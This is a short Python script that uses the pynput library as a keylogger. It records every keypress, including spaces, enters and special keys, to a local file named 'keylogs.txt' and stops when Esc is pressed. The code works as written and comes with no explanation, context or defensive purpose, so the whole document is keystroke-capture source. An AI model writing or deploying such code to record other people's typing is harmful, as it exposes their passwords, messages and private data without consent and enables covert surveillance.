import pynput

from pynput.keyboard import Listener, Key

def on_press(key):
    with open('keylogs.txt', 'a') as f:
        try:
            char = str(key).strip("'") 
            if len(char) == 1:
                f.write(char)
            elif key == Key.space:
                f.write(' [SPACE] ')
            elif key == Key.enter:
                f.write(' [ENTER]')
            else:
                f.write(' [{}]'.format(key)) 
        except Exception as e:
            print(e)
def on_release(key):
    if key == Key.esc:
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
